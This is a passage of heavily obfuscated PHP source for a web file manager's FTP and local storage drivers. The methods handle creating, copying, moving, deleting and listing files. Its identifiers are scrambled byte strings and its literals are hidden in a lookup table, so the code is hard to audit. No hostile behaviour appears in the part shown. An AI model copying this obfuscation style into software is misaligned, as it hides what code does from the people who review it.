REPEAT_RENAME) { if ($this->setContent($É×ñ±ˆ, $šÕ©Ø»È)) { return $this->getPathOuter($É×ñ±ˆ); } return !1; } public function mkdir($–‡¨²×Ç, $¬ÖÁÊÌ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $–‡¨²×Ç = $this->iconvSystem($–‡¨²×Ç); if ($this->_isFolder($–‡¨²×Ç) || @ftp_mkdir($this->connect, $–‡¨²×Ç)) { return $this->getPathOuter($–‡¨²×Ç); } if (!$this->mkdir($this->pathFather($–‡¨²×Ç))) { return !1; } if ($–‡¨²×Ç = @ftp_mkdir($this->connect, $–‡¨²×Ç)) { return $this->getPathOuter($–‡¨²×Ç); } return !1; } public function copyFile($—¾Äşº, $ÊùşÍàš) { if (!$this->_isconn()) { return !1; } $ ÕºÃìß = $this->pathThis($this->iconvSystem($—¾Äşº)); $ÂŸ¦è•¦ = $this->tempFile($ ÕºÃìß); $¼şšƒ = $this->iconvApp($ÂŸ¦è•¦); $this->download($—¾Äşº, $¼şšƒ); $ĞºÕ„ÛÌ = $this->upload($ÊùşÍàš, $¼şšƒ); $this->tempFileRemve($ÂŸ¦è•¦); return $ĞºÕ„ÛÌ; } public function moveFile($Äà´Ù‰ø, $‡ï¾¬£¤) { if (!$this->_isconn()) { return !1; } $Äà´Ù‰ø = $this->iconvSystem($Äà´Ù‰ø); $‡ï¾¬£¤ = $this->iconvSystem($‡ï¾¬£¤); $•ÇÚí¼Ó = @ftp_rename($this->connect, $Äà´Ù‰ø, $‡ï¾¬£¤); return $•ÇÚí¼Ó ? $this->getPathOuter($‡ï¾¬£¤) : !1; } public function delFile($Ş—®ÜŞ™) { if (!$this->_isconn()) { return !1; } $Ş—®ÜŞ™ = $this->iconvSystem($Ş—®ÜŞ™); return @ftp_delete($this->connect, $Ş—®ÜŞ™); } public function delFolder($¿ÑÊê»¨) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ó®Äø«Ú = $È¢Ğ¥‹£ = array(); $this->fileList($¿ÑÊê»¨, $Ó®Äø«Ú, $È¢Ğ¥‹£, !0); $this->listItemCache = !0; foreach ($È¢Ğ¥‹£ as $å×ù¼ä£) { $Úåñ«ßö = $this->iconvSystem($å×ù¼ä£[$_SERVER[Ó¡Ÿ§‚][32]]); $¢öëùŠì = @ftp_delete($this->connect, $Úåñ«ßö); if (!$¢öëùŠì) { return !1; } } foreach ($Ó®Äø«Ú as $Úåñ«ßö) { $Úåñ«ßö = $this->iconvSystem($Úåñ«ßö); $¢öëùŠì = @ftp_rmdir($this->connect, $Úåñ«ßö); if (!$¢öëùŠì) { return !1; } } $¿ÑÊê»¨ = $this->iconvSystem($¿ÑÊê»¨); return @ftp_rmdir($this->connect, $¿ÑÊê»¨); } public function rename($ï»÷™è, $¸ÙÔú±É) { $Íåâ’À€ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->_isconn()) { return !1; } $©Å³Õ·å = $this->fileNameAuto($this->pathFather($ï»÷™è), $¸ÙÔú±É); $©Å³Õ·å = $this->iconvSystem($©Å³Õ·å); $ï»÷™è = $this->iconvSystem($ï»÷™è); $¹£õŒÓ• = $this->pathFather($ï»÷™è); $ÈïïÏñÙ = rtrim($¹£õŒÓ•, $Íåâ’À€[8]) . $Íåâ’À€[8] . $©Å³Õ·å; $¸ûñŒñÔ = @ftp_rename($this->connect, $ï»÷™è, $ÈïïÏñÙ); $ÈïïÏñÙ = $this->iconvApp($ÈïïÏñÙ); return $¸ûñŒñÔ ? $this->getPathOuter($ÈïïÏñÙ) : !1; } private function folderInfo($îàçõ‚¶, $ óş—Š = false) { $’´€öš† =& $_SERVER[Ó¡Ÿ§‚]; $×Ì‰ÔÍ = array($’´€öš†[32] => $this->pathThis($îàçõ‚¶), $’´€öš†[84] => $this->getPathOuter($’´€öš†[8] . $îàçõ‚¶), $’´€öš†[33] => $’´€öš†[75]); if ($ óş—Š) { return $×Ì‰ÔÍ; } $×Ì‰ÔÍ[$’´€öš†[201]] = $×Ì‰ÔÍ[$’´€öš†[85]] = 0; $×Ì‰ÔÍ[$’´€öš†[202]] = $×Ì‰ÔÍ[$’´€öš†[203]] = !0; return $×Ì‰ÔÍ; } private function fileInfo($üı‹áÕ¤, $Ûèçøé¥ = false, $È¸û¥ = array()) { $Ñ¸á³İï =& $_SERVER[Ó¡Ÿ§‚]; $åÕ–º’ = array($Ñ¸á³İï[32] => $this->pathThis($üı‹áÕ¤), $Ñ¸á³İï[84] => $this->getPathOuter($Ñ¸á³İï[8] . $üı‹áÕ¤), $Ñ¸á³İï[33] => $Ñ¸á³İï[200], $Ñ¸á³İï[76] => isset($È¸û¥[$Ñ¸á³İï[76]]) ? $È¸û¥[$Ñ¸á³İï[76]] : 0, $Ñ¸á³İï[174] => $this->ext($üı‹áÕ¤)); if ($Ûèçøé¥) { return $åÕ–º’; } $åÕ–º’[$Ñ¸á³İï[201]] = $åÕ–º’[$Ñ¸á³İï[85]] = 0; $åÕ–º’[$Ñ¸á³İï[202]] = $åÕ–º’[$Ñ¸á³İï[203]] = !0; $Àö¾¡ = $this->iconvSystem($üı‹áÕ¤); $åÕ–º’[$Ñ¸á³İï[85]] = @ftp_mdtm($this->connect, $Àö¾¡); if (empty($È¸û¥)) { $È¸û¥ = $this->objectMeta($üı‹áÕ¤); if (!$È¸û¥) { return $åÕ–º’; } } $åÕ–º’[$Ñ¸á³İï[76]] = $È¸û¥[$Ñ¸á³İï[76]]; return $åÕ–º’; } public function size($©¥²·á¿) { $Ï©—’‡„ = $this->objectMeta($©¥²·á¿); return $Ï©—’‡„ ? $Ï©—’‡„[$_SERVER[Ó¡Ÿ§‚][76]] : 0; } public function info($ËÑÔ‹Š©) { if ($this->isFile($ËÑÔ‹Š©)) { return $this->fileInfo($ËÑÔ‹Š©, 0); } else { if ($this->isFolder($ËÑÔ‹Š©)) { return $this->folderInfo($ËÑÔ‹Š©); } } return !1; } private function fileList($Â’ˆ¥‹Å, &$Íûî‡¦–, &$Éªœğ©…, $œÕ«¸ßŞ = false) { $§Š‘Ì¯ =& $_SERVER[Ó¡Ÿ§‚]; $Â’ˆ¥‹Å = $this->iconvSystem($Â’ˆ¥‹Å); if (!$this->isFolder($Â’ˆ¥‹Å)) { return !1; } @ftp_chdir($this->connect, $§Š‘Ì¯[8]); $Â’ˆ¥‹Å = rtrim($Â’ˆ¥‹Å, $§Š‘Ì¯[8]) . $§Š‘Ì¯[8]; check_abort(); $ß÷½àıß = @ftp_rawlist($this->connect, $Â’ˆ¥‹Å); if (!$ß÷½àıß) { $ß÷½àıß = array(); } $¾×Ö÷Ë = array($§Š‘Ì¯[10] => 1, $§Š‘Ì¯[1385] => 1); foreach ($ß÷½àıß as $óÒŞÂ¨—) { $ƒØ†áé = $this->_listItem($óÒŞÂ¨—); if ($ƒØ†áé[0] == $§Š‘Ì¯[757]) { continue; } $ŒçåÄÕó = $ƒØ†áé[8]; if (empty($ŒçåÄÕó) && $ŒçåÄÕó !== $§Š‘Ì¯[198] || isset($¾×Ö÷Ë[$ŒçåÄÕó])) { continue; } $ŒçåÄÕó = $this->iconvApp($Â’ˆ¥‹Å . ltrim($ŒçåÄÕó, $§Š‘Ì¯[8])); $´×ßË˜ = array($§Š‘Ì¯[32] => $ŒçåÄÕó, $§Š‘Ì¯[33] => $§Š‘Ì¯[200], $§Š‘Ì¯[76] => $ƒØ†áé[4]); if (substr($óÒŞÂ¨—, 0, 1) == $§Š‘Ì¯[1386]) { $´×ßË˜[$§Š‘Ì¯[33]] = $§Š‘Ì¯[75]; $´×ßË˜[$§Š‘Ì¯[76]] = 0; } $±¸ìé¡Ë = $´×ßË˜[$§Š‘Ì¯[33]] == $§Š‘Ì¯[75] ? !0 : !1; $this->cacheMethodInfoSet($ŒçåÄÕó, $±¸ìé¡Ë, $´×ßË˜); if ($±¸ìé¡Ë) { $Íûî‡¦–[] = $ŒçåÄÕó; if ($œÕ«¸ßŞ) { $this->fileList($ŒçåÄÕó, $Íûî‡¦–, $Éªœğ©…, $œÕ«¸ßŞ); } continue; } $Éªœğ©…[] = $´×ßË˜; } $this->cacheMethodInfoSet($Â’ˆ¥‹Å, !0); } private function _listItem($¿¥ùä¬å) { if (empty($¿¥ùä¬å)) { return array(); } $êüÎë®² = preg_split($_SERVER[Ó¡Ÿ§‚][1387], $¿¥ùä¬å); if (count($êüÎë®²) <= 9) { return $êüÎë®²; } $êüÎë®²[8] = trim(substr($¿¥ùä¬å, strpos($¿¥ùä¬å, $êüÎë®²[7]) + strlen($êüÎë®²[7]))); return array_splice($êüÎë®², 0, 9); } public function listPath($·¯ƒ„¶¯, $œ×®¦ñÓ = false) { $®í´ØØ„ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->_isconn()) { return !1; } $ê”ÕÁ½× = $©º•Å‹¡ = array(); $this->fileList($·¯ƒ„¶¯, $ê”ÕÁ½×, $©º•Å‹¡); foreach ($ê”ÕÁ½× as $ª¯óöÒ => $ÉÜÔßö) { $ê”ÕÁ½×[$ª¯óöÒ] = $this->folderInfo($ÉÜÔßö, $œ×®¦ñÓ); } foreach ($©º•Å‹¡ as $ª¯óöÒ => $ÉÜÔßö) { $©º•Å‹¡[$ª¯óöÒ] = $this->fileInfo($ÉÜÔßö[$®í´ØØ„[32]], $œ×®¦ñÓ, $ÉÜÔßö); } return array($®í´ØØ„[82] => $ê”ÕÁ½×, $®í´ØØ„[83] => $©º•Å‹¡); } public function has($íÅéæü­, $†¦ÑİÁ = false, $ÚÁ©İ… = true) { $Â™­åêŒ =& $_SERVER[Ó¡Ÿ§‚]; $·•ÃÀíá = $˜éÙƒóê = array(); $´¹„®øØ = $†¦ÑİÁ ? !0 : !1; $this->fileList($íÅéæü­, $·•ÃÀíá, $˜éÙƒóê, $´¹„®øØ); if ($†¦ÑİÁ) { return array($Â™­åêŒ[207] => count($˜éÙƒóê), $Â™­åêŒ[208] => count($·•ÃÀíá)); } if ($ÚÁ©İ…) { if (count($˜éÙƒóê)) { return !0; } } else { if (count($·•ÃÀíá)) { return !0; } } return !1; } public function listAll($ğó¯á) { $ãæÒÚº‹ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->_isconn()) { return !1; } $¸¢Ã×è = $¸Õº«–Û = array(); $this->fileList($ğó¯á, $¸¢Ã×è, $¸Õº«–Û, !0); $ë•¯‚äæ = array_to_keyvalue($¸Õº«–Û, $ãæÒÚº‹[32]); foreach ($¸¢Ã×è as $†Şö¬óˆ) { if (is_string($†Şö¬óˆ)) { $ë•¯‚äæ[$†Şö¬óˆ] = array($ãæÒÚº‹[76] => 0); } } return $this->listAllFiles($ğó¯á, $ë•¯‚äæ); } public function getContent($‘°ß¢ŞŞ) { if (!$this->_isconn()) { return !1; } $‘°ß¢ŞŞ = $this->iconvSystem($‘°ß¢ŞŞ); return $this->fileSubstr($‘°ß¢ŞŞ); } public function setContent($©÷»Ûğ, $Œƒ§æ€ü = '') { if (!$this->_isconn()) { return !1; } $ÊôğÍ¸Ü = $this->pathThis($this->iconvSystem($©÷»Ûğ)); $Ê™¥ù¢ = $this->tempFile($ÊôğÍ¸Ü); file_put_contents($Ê™¥ù¢, $Œƒ§æ€ü); $Ñ¼õĞİÜ = $this->upload($©÷»Ûğ, $this->iconvApp($Ê™¥ù¢)); $this->tempFileRemve($Ê™¥ù¢); return $Ñ¼õĞİÜ; } public function fileSubstr($êÓóÊ¬, $†®©İä— = 0, $‘½«ÈÛê = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($êÓóÊ¬, $†®©İä—, $‘½«ÈÛê); } private function ftpRequest($äÃ’Ç–¦, $ú³„¾¹ò = 0, $ã¹öˆĞœ = false) { $äÃ’Ç–¦ = $this->iconvSystem($äÃ’Ç–¦); $˜»ïæ‡ö = $this->scheme . $this->host . $_SERVER[Ó¡Ÿ§‚][4] . $this->port; $ãÓ—â™ë = curl_init(); curl_setopt($ãÓ—â™ë, CURLOPT_URL, $˜»ïæ‡ö . $this->pathEncode($äÃ’Ç–¦)); curl_setopt($ãÓ—â™ë, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ã¹öˆĞœ) { $ŞÀŸÉæÆ = $ú³„¾¹ò + $ã¹öˆĞœ - 1; curl_setopt($ãÓ—â™ë, CURLOPT_RANGE, "{$ú³„¾¹ò}\x2d{$ŞÀŸÉæÆ}"); } curl_setopt($ãÓ—â™ë, CURLOPT_RETURNTRANSFER, 1); $ØèÚü¦‘ = curl_exec($ãÓ—â™ë); curl_close($ãÓ—â™ë); return $ØèÚü¦‘; } public function upload($šµìææõ, $÷³¯©ô–, $ÉõÏÔ‘ò = false, $×½¹‹í’ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($šµìææõ))) { return !1; } $šµìææõ = $this->iconvSystem($šµìææõ); $÷³¯©ô– = $this->iconvSystem($÷³¯©ô–); $±Ë›‹½› = ftp_nb_put($this->connect, $šµìææõ, $÷³¯©ô–, FTP_BINARY); while ($±Ë›‹½› == FTP_MOREDATA) { $±Ë›‹½› = ftp_nb_continue($this->connect); } if ($±Ë›‹½› != FTP_FINISHED) { return !1; } return $this->getPathOuter($šµìææõ); } public function download($ñ›çŸÙ, $ê‰Ÿ·³² = '') { if (!$this->_isconn()) { return !1; } $ÆÊš¶‘ = $this->pathFather($ê‰Ÿ·³²); if (!IO::mkdir($ÆÊš¶‘)) { return !1; } $ñ›çŸÙ = $this->iconvSystem($ñ›çŸÙ); $ê‰Ÿ·³² = $this->iconvSystem($ê‰Ÿ·³²); $çÄĞ¿Š = ftp_nb_get($this->connect, $ê‰Ÿ·³², $ñ›çŸÙ, FTP_BINARY); while ($çÄĞ¿Š == FTP_MOREDATA) { $çÄĞ¿Š = ftp_nb_continue($this->connect); } if ($çÄĞ¿Š != FTP_FINISHED) { return !1; } return $this->iconvApp($ê‰Ÿ·³²); } public function exist($µŞ„¼ÊÒ) { return $this->isFile($µŞ„¼ÊÒ) || $this->isFolder($µŞ„¼ÊÒ); } public function isFile($—óå­ ) { return !$this->isFolder($—óå­ ) && $this->objectMeta($—óå­ ); } public function isFolder($³‹œ¾ Û) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][165], $³‹œ¾ Û); } protected function objectMeta($½™¬´¾—) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][167], $½™¬´¾—); } protected function _objectMeta($šÑ·å„³) { $Òú€ËÕ‰ =& $_SERVER[Ó¡Ÿ§‚]; if ($šÑ·å„³ == $Òú€ËÕ‰[12] || $šÑ·å„³ == $Òú€ËÕ‰[8]) { return array(); } if (!$this->_isconn()) { return !1; } $šÑ·å„³ = $this->iconvSystem($šÑ·å„³); $˜¢…ŞØå = array($Òú€ËÕ‰[32] => $this->iconvApp($šÑ·å„³), $Òú€ËÕ‰[33] => $Òú€ËÕ‰[200], $Òú€ËÕ‰[76] => 0); @ftp_chdir($this->connect, $Òú€ËÕ‰[8]); $‹†ŸÊ˜ = @ftp_size($this->connect, $šÑ·å„³); if ($‹†ŸÊ˜ != -1) { $˜¢…ŞØå[$Òú€ËÕ‰[76]] = $‹†ŸÊ˜; } else { $…³š¬Ùñ = @ftp_chdir($this->connect, $šÑ·å„³); if (!$…³š¬Ùñ) { return !1; } $˜¢…ŞØå[$Òú€ËÕ‰[33]] = $Òú€ËÕ‰[75]; } return $˜¢…ŞØå; } protected function _isFolder($×Æƒ—†ü) { $²øü‚éğ =& $_SERVER[Ó¡Ÿ§‚]; if ($×Æƒ—†ü == $²øü‚éğ[12] || $×Æƒ—†ü == $²øü‚éğ[8]) { return !0; } $ˆ»á®ş = $this->_objectMeta($×Æƒ—†ü); return isset($ˆ»á®ş[$²øü‚éğ[33]]) && $ˆ»á®ş[$²øü‚éğ[33]] == $²øü‚éğ[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($—Éµ’èå) { if (substr($—Éµ’èå, 0, 2) == $_SERVER[Ó¡Ÿ§‚][1378]) { $—Éµ’èå = BASIC_PATH . substr($—Éµ’èå, 2); } return $—Éµ’èå; } public function iconvApp($Îş§¸óš) { $°éô¶ÃÍ =& $_SERVER[Ó¡Ÿ§‚]; global $config; return $this->iconvTo($Îş§¸óš, $config[$°éô¶ÃÍ[1376]], $config[$°éô¶ÃÍ[1375]]); } public function iconvSystem($ªŸÑîüü) { $şÓ¢”Œİ =& $_SERVER[Ó¡Ÿ§‚]; global $config; return $this->iconvTo($ªŸÑîüü, $config[$şÓ¢”Œİ[1375]], $config[$şÓ¢”Œİ[1376]]); } public function getPathOuter($‰…ïç™ƒ) { $´î¸¾êŠ =& $_SERVER[Ó¡Ÿ§‚]; $¶çë“·– = $this->iconvApp($this->pathBase); $‰…ïç™ƒ = $this->iconvApp($‰…ïç™ƒ); if (substr($¶çë“·–, 0, 2) == $´î¸¾êŠ[1378]) { $¶çë“·– = BASIC_PATH . substr($¶çë“·–, 2); } if (substr($‰…ïç™ƒ, 0, 2) == $´î¸¾êŠ[1378]) { $‰…ïç™ƒ = BASIC_PATH . substr($‰…ïç™ƒ, 2); } $¶çë“·– = KodIO::clear($¶çë“·–); $‰…ïç™ƒ = KodIO::clear($‰…ïç™ƒ); $‰…ïç™ƒ = substr($‰…ïç™ƒ, strlen($¶çë“·–)); if (empty($this->pathDriver)) { return $‰…ïç™ƒ; } return $this->pathDriver . $´î¸¾êŠ[8] . ltrim($‰…ïç™ƒ, $´î¸¾êŠ[8]); } public function mkfile($„™Ö±«Ô, $¥™ÇšÊ· = '', $Ï–…’ Å = REPEAT_RENAME) { $„™Ö±«Ô = $this->iconvSystem($„™Ö±«Ô); @touch($„™Ö±«Ô); if ($¥™ÇšÊ·) { file_put_contents($„™Ö±«Ô, $¥™ÇšÊ·); } @chmod($„™Ö±«Ô, $this->pathAuth); return is_file($„™Ö±«Ô) ? $this->getPathOuter($„™Ö±«Ô) : !1; } public function mkdir($×”÷õı, $ü’œ¨Ñ = REPEAT_SKIP) { $×”÷õı = $this->iconvSystem($×”÷õı); if (is_dir($×”÷õı)) { return $this->getPathOuter($×”÷õı); } @mkdir($×”÷õı, $this->pathAuth, !0); @chmod($×”÷õı, $this->pathAuth); return is_dir($×”÷õı) ? $this->getPathOuter($×”÷õı) : !1; } public function copyFile($÷“—¬¸Ö, $ÇíãšÚ·) { $this->mkdir($this->pathFather($ÇíãšÚ·)); $÷“—¬¸Ö = $this->iconvSystem($÷“—¬¸Ö); $ÇíãšÚ· = $this->iconvSystem($ÇíãšÚ·); $ïšãå = copy_64($÷“—¬¸Ö, $ÇíãšÚ·); @chmod($ÇíãšÚ·, $this->pathAuth); return $ïšãå ? $this->getPathOuter($ÇíãšÚ·) : !1; } public function moveFile($ùúİŠ–ò, $“ğ¡‰ú•) { $this->mkdir($this->pathFather($“ğ¡‰ú•)); $ùúİŠ–ò = $this->iconvSystem($ùúİŠ–ò); $“ğ¡‰ú• = $this->iconvSystem($“ğ¡‰ú•); $¦¿Üõç = intval(@rename($ùúİŠ–ò, $“ğ¡‰ú•)); if (!$¦¿Üõç) { if ($¦¿Üõç = intval(@copy_64($ùúİŠ–ò, $“ğ¡‰ú•))) { @unlink($ùúİŠ–ò); } } @chmod($“ğ¡‰ú•, $this->pathAuth); return $¦¿Üõç ? $this->getPathOuter($“ğ¡‰ú•) : !1; } public function movePath($‡üè¼ôì, $íÏÃı„í, $ˆ×«°Š = false) { $…µ²Óå =& $_SERVER[Ó¡Ÿ§‚]; $‡üè¼ôì = $this->iconvSystem($‡üè¼ôì); $íÏÃı„í = $this->iconvSystem($íÏÃı„í); $’Ï€èì‰ = rtrim($íÏÃı„í, $…µ²Óå[8]) . $…µ²Óå[8] . ($ˆ×«°Š ? $ˆ×«°Š : get_path_this($‡üè¼ôì)); if (file_exists($’Ï€èì‰)) { return !1; } $®£É«’ƒ = intval(@rename($‡üè¼ôì, $’Ï€èì‰)); $®£É«’ƒ = file_exists($’Ï€èì‰); return $®£É«’ƒ ? $this->getPathOuter($’Ï€èì‰) : !1; } public function delFile($şè—±ó) { $şè—±ó = $this->iconvSystem($şè—±ó); if (!@unlink($şè—±ó)) { @chmod($şè—±ó, $this->pathAuth); if (!@unlink($şè—±ó)) { return !1; } } else { return !0; } } public function delFolder($õ—ƒÖë) { $æ­ÃšÉ¨ =& $_SERVER[Ó¡Ÿ§‚]; $õ—ƒÖë = $this->iconvSystem($õ—ƒÖë); if (!is_dir($õ—ƒÖë)) { return !0; } if (!($û¦Šöì¾ = opendir($õ—ƒÖë))) { return !1; } while (($¤…şìÈ¡ = readdir($û¦Šöì¾)) !== !1) { if ($¤…şìÈ¡ == $æ­ÃšÉ¨[10] || $¤…şìÈ¡ == $æ­ÃšÉ¨[1385]) { continue; } $Ú÷®­æÄ = $õ—ƒÖë . $æ­ÃšÉ¨[8] . $¤…şìÈ¡; if (is_file($Ú÷®­æÄ) || is_link($Ú÷®­æÄ)) { if (!unlink($Ú÷®­æÄ)) { chmod($Ú÷®­æÄ, $this->pathAuth); if (!unlink($Ú÷®­æÄ)) { return !1; } } } else { if (is_dir($Ú÷®­æÄ)) { chmod($Ú÷®­æÄ, $this->pathAuth); $Ú÷®­æÄ = $this->iconvApp($Ú÷®­æÄ); if (!$this->delFolder($Ú÷®­æÄ)) { return !1; } } } } closedir($û¦Šöì¾); return rmdir($õ—ƒÖë); } public function rename($€¦È§¤µ, $ï“Ø›‹) { $Í¿¤ú« =& $_SERVER[Ó¡Ÿ§‚]; $ñù¥õŞ = $this->fileNameAuto($this->pathFather($€¦È§¤µ), $ï“Ø›‹); $ñù¥õŞ = $this->iconvSystem($ñù¥õŞ); $€¦È§¤µ = $this->iconvSystem($€¦È§¤µ); $ğƒÅ§ñ» = $this->pathFather($€¦È§¤µ); $ü»§ó€‹ = rtrim($ğƒÅ§ñ», $Í¿¤ú«[8]) . $Í¿¤ú«[8] . $ñù¥õŞ; $ˆ¸£—œÖ = @rename($€¦È§¤µ, $ü»§ó€‹); $ü»§ó€‹ = $this->iconvApp($ü»§ó€‹); return $ˆ¸£—œÖ ? $this->getPathOuter($ü»§ó€‹) : !1; } public function size($§·Ä³«ì) { $§·Ä³«ì = $this->iconvSystem($§·Ä³«ì); return filesize_64($§·Ä³«ì); } public function info($÷« µ—ª) { $÷« µ—ª = $this->iconvSystem($÷« µ—ª); if ($this->isFolder($÷« µ—ª)) { return $this->folderInfo($÷« µ—ª); } else { if ($this->isFile($÷« µ—ª)) { return $this->fileInfo($÷« µ—ª); } } return !1; } protected function infoChildren($¥ƒŒ£¨, &$¬ÊêµşÔ, $Œ–¾µ•Ÿ = true) { $Á‘Ğ¤­¨ =& $_SERVER[Ó¡Ÿ§‚]; check_abort_echo(); $¥ƒŒ£¨ = rtrim($¥ƒŒ£¨, $Á‘Ğ¤­¨[8]) . $Á‘Ğ¤­¨[8]; if ($Œ–¾µ•Ÿ) { $¥ƒŒ£¨ = $this->iconvSystem($¥ƒŒ£¨); } if (!($ˆ¿™šÆ£ = @opendir($¥ƒŒ£¨))) { return; } while (($Üô‹È¾ç = readdir($ˆ¿™šÆ£)) !== !1) { if ($Üô‹È¾ç == $Á‘Ğ¤­¨[10] || $Üô‹È¾ç == $Á‘Ğ¤­¨[1385]) { continue; } $ğœÓ®ß = $¥ƒŒ£¨ . $Üô‹È¾ç; if (is_file($ğœÓ®ß) || is_link($ğœÓ®ß)) { $¬ÊêµşÔ[$Á‘Ğ¤­¨[77]]++; $¬ÊêµşÔ[$Á‘Ğ¤­¨[76]] += filesize_64($ğœÓ®ß); } else { if (is_dir($ğœÓ®ß)) { $¬ÊêµşÔ[$Á‘Ğ¤­¨[78]]++; $this->infoChildren($ğœÓ®ß, $¬ÊêµşÔ, !1); } } } closedir($ˆ¿™šÆ£); } private function folderInfo($®©Çºğº, $Î¾­Åµ = false) { $»ñ¯¬¸ş =& $_SERVER[Ó¡Ÿ§‚]; $®©Çºğº = rtrim($®©Çºğº, $»ñ¯¬¸ş[8]) . $»ñ¯¬¸ş[8]; $ë·¶µ£’ = $this->iconvApp($this->pathThis($®©Çºğº)); if ($Î¾­Åµ) { return array($»ñ¯¬¸ş[32] => $ë·¶µ£’, $»ñ¯¬¸ş[84] => $this->getPathOuter($®©Çºğº), $»ñ¯¬¸ş[33] => $»ñ¯¬¸ş[75]); } $¥ñÜ°ãÎ = array($»ñ¯¬¸ş[32] => $ë·¶µ£’, $»ñ¯¬¸ş[84] => $this->getPathOuter($®©Çºğº), $»ñ¯¬¸ş[33] => $»ñ¯¬¸ş[75], $»ñ¯¬¸ş[201] => @filectime($®©Çºğº), $»ñ¯¬¸ş[85] => @filemtime($®©Çºğº), $»ñ¯¬¸ş[1388] => @fileatime($®©Çºğº), $»ñ¯¬¸ş[1389] => is_readable($®©Çºğº), $»ñ¯¬¸ş[1390] => is_writable($®©Çºğº), $»ñ¯¬¸ş[1391] => get_mode($®©Çºğº)); return $¥ñÜ°ãÎ; } private function fileInfo($²±—Òş‚, $Ïö±‚İ = false) { $™õµËÒô =& $_SERVER[Ó¡Ÿ§‚]; $Ò£Û§ = $this->iconvApp($this->pathThis($²±—Òş‚)); if ($Ïö±‚İ) { return array($™õµËÒô[32] => $Ò£Û§, $™õµËÒô[84] => $this->getPathOuter($²±—Òş‚), $™õµËÒô[33] => $™õµËÒô[200], $™õµËÒô[76] => $this->size($²±—Òş‚), $™õµËÒô[174] => $this->ext($Ò£Û§)); } $ëıÜ’ÁÒ = array($™õµËÒô[32] => $Ò£Û§, $™õµËÒô[84] => $this->getPathOuter($²±—Òş‚), $™õµËÒô[33] => $™õµËÒô[200], $™õµËÒô[201] => @filectime($²±—Òş‚), $™õµËÒô[85] => @filemtime($²±—Òş‚), $™õµËÒô[1388] => @fileatime($²±—Òş‚), $™õµËÒô[76] => $this->size($²±—Òş‚), $™õµËÒô[174] => $this->ext($Ò£Û§), $™õµËÒô[1389] => is_readable($²±—Òş‚), $™õµËÒô[1390] => is_writable($²±—Òş‚), $™õµËÒô[1391] => get_mode($²±—Òş‚)); return $ëıÜ’ÁÒ; } public function exist($Ğó¤®ŠÏ) { $Ğó¤®ŠÏ = $this->iconvSystem($Ğó¤®ŠÏ); return @file_exists($Ğó¤®ŠÏ); } public function isFile($ÃŸ‹¼Ë) { $ÃŸ‹¼Ë = $this->iconvSystem($ÃŸ‹¼Ë); return @is_file($ÃŸ‹¼Ë); } public function isFolder($ĞŞ¾˜Ù) { $ĞŞ¾˜Ù = $this->iconvSystem($ĞŞ¾˜Ù); return @is_dir($ĞŞ¾˜Ù); } public function listPath($êŞøñ½§, $Øº¥Ş¨­ = false) { $İÈüÄ‡ =& $_SERVER[Ó¡Ÿ§‚]; $êŞøñ½§ = $this->iconvSystem($êŞøñ½§); $êŞøñ½§ = rtrim($êŞøñ½§, $İÈüÄ‡[8]) . $İÈüÄ‡[8]; $Á­ıÙ³¶ = array($İÈüÄ‡[82] => array(), $İÈüÄ‡[83] => array()); if (!($’¨Ööôø = @opendir($êŞøñ½§))) { return $Á­ıÙ³¶; } while (($ £ÉÁåº = readdir($’¨Ööôø)) !== !1) { if ($ £ÉÁåº == $İÈüÄ‡[10] || $ £ÉÁåº == $İÈüÄ‡[1385]) { continue; } $Ğ¾¦‘ì = $êŞøñ½§ . $ £ÉÁåº; if (is_file($Ğ¾¦‘ì)) { $Á­ıÙ³¶[$İÈüÄ‡[83]][] = $this->fileInfo($Ğ¾¦‘ì, $Øº¥Ş¨­); } else { $Á­ıÙ³¶[$İÈüÄ‡[82]][] = $this->folderInfo($Ğ¾¦‘ì, $Øº¥Ş¨­); } } closedir($’¨Ööôø); return $Á­ıÙ³¶; } public function listAll($÷Í±„®á, &$Ü¿‰–¢ = array()) { $¸é˜çØä =& $_SERVER[Ó¡Ÿ§‚]; $÷Í±„®á = $this->iconvSystem($÷Í±„®á); $÷Í±„®á = rtrim($÷Í±„®á, $¸é˜çØä[8]) . $¸é˜çØä[8]; if (!($ŠŞğ°°ú = @opendir($÷Í±„®á))) { return $Ü¿‰–¢; } while (($•Š®Ñ—Ë = readdir($ŠŞğ°°ú)) !== !1) { if ($•Š®Ñ—Ë == $¸é˜çØä[10] || $•Š®Ñ—Ë == $¸é˜çØä[1385]) { continue; } $ÙÌ˜®üÙ = $÷Í±„®á . $•Š®Ñ—Ë; $ÈÛ¹İñ¹ = is_dir($ÙÌ˜®üÙ) && !is_link($ÙÌ˜®üÙ) ? 1 : 0; $ÙÌ˜®üÙ = $ÈÛ¹İñ¹ ? $ÙÌ˜®üÙ . $¸é˜çØä[8] : $ÙÌ˜®üÙ; $Ü¿‰–¢[] = array($¸é˜çØä[84] => $ÙÌ˜®üÙ, $¸é˜çØä[75] => $ÈÛ¹İñ¹, $¸é˜çØä[85] => intval(@filemtime($ÙÌ˜®üÙ)), $¸é˜çØä[76] => $ÈÛ¹İñ¹ ? 0 : intval($this->size($ÙÌ˜®üÙ))); if ($ÈÛ¹İñ¹) { $this->listAll($ÙÌ˜®üÙ, $Ü¿‰–¢); } } closedir($ŠŞğ°°ú); return $Ü¿‰–¢; } public function has($×Œñæş, $Çª‹øê€ = false, $÷ºş„õ‚ = true) { $ëŒƒŒàô =& $_SERVER[Ó¡Ÿ§‚]; $×Œñæş = $this->iconvSystem($×Œñæş); $×Œñæş = rtrim($×Œñæş, $ëŒƒŒàô[8]) . $ëŒƒŒàô[8]; if (!($íğ‚Ğ£‘ = @opendir($×Œñæş))) { return !1; } $ˆÛÈÔ•Ó = 0; $ú‰çøÏ = 0; $Ò¬Î¬¶Ê = 0; while (($Àİº›ˆ = readdir($íğ‚Ğ£‘)) !== !1) { if 